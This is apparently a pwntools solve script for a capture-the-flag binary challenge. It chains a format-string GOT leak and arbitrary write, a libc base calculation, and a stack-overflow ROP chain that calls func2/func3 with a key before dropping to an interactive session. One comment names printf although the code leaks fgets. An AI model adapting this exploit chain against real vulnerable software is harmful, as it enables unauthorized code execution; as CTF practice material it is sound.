from pathlib import Path
import argparse
from pwn import *

context.arch = "amd64"
ROOT = Path(__file__).resolve().parent.parent
elf = ELF(str(ROOT / "dist" / "chall"), checksec=False)
OFFSET = 136
KEY = 0x1337BEEF

def first_stage():
    # Leak printf@GOT while writing the non-PIE gate address into next_stage.
    got, target = elf.got["fgets"], elf.sym["next_stage"]
    gate = elf.sym["gate"]
    low, high = gate & 0xffff, (gate >> 16) & 0xff
    # Offset 40 is argument 11 on the remote binary.
    fmt, count = b"%11$s", 6
    d = (low - count) & 0xffff
    if d: fmt += b"%1$" + str(d).encode() + b"c"
    fmt += b"%12$hn"; count = low
    d = (high - (count & 0xff)) & 0xff
    if d: fmt += b"%1$" + str(d).encode() + b"c"
    fmt += b"%13$hhn"
    assert len(fmt) <= 40
    return fmt.ljust(40, b"A") + p64(got) + p64(target) + p64(target + 2)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("port", nargs="?", type=int, default=8011)
    ap.add_argument("--libc", default=None, help="libc.so.6 matching the container")
    ap.add_argument("--local", action="store_true")
    ns = ap.parse_args()
    io = process(str(ROOT / "dist" / "chall")) if ns.local else remote(ns.host, ns.port)
    libc_path = ns.libc or os.environ.get("LIBC_PATH")
    if not libc_path:
        log.error("supply --libc or set LIBC_PATH to the container libc")
    if not os.path.isfile(libc_path):
        log.error("libc file not found: %s (use the libc.so.6 from the remote container)", libc_path)
    libc = ELF(libc_path, checksec=False)
    io.sendlineafter(b"Input : ", first_stage())
    try:
        data = io.recvuntil(b"Gateway to restricted site.")
    except EOFError:
        log.failure("target exited before gate; output was: %r", io.clean(timeout=0.2))
        raise
    leak = data.rsplit(b"Input : ", 1)[-1][:6]
    libc.address = u64(leak.ljust(8, b"\0")) - libc.sym["fgets"]
    log.info("libc base = %#x", libc.address)
    io.sendlineafter(b"Input password : ", b"A" * OFFSET + p64(elf.sym["func1"]))
    pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
    ret = ROP(elf).find_gadget(["ret"])[0]
    chain = flat(b"A" * OFFSET, pop_rdi, KEY, ret, elf.sym["func2"], elf.sym["func3"], libc.sym["exit"])
    io.sendlineafter(b"Input : ", chain)
    io.sendlineafter(b"Input : ", b"continue")
    io.interactive()

if __name__ == "__main__":
    main()
